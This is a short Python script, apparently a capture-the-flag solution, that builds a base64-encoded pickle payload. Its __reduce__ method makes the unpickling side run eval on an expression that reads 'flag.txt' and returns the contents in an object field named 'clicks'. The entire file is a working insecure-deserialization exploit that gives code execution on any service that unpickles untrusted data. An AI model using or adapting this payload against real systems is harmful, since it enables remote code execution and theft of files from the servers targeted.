import base64
import pickle

class FileContent:
    def __reduce__(self):
        expression = (
            "__import__('types').SimpleNamespace("
            "clicks=__import__('pathlib').Path('flag.txt').read_text(encoding='utf-8'))"
        )
        return eval, (expression,)

raw = base64.b64encode(pickle.dumps(FileContent())).decode("ascii")
print(raw)
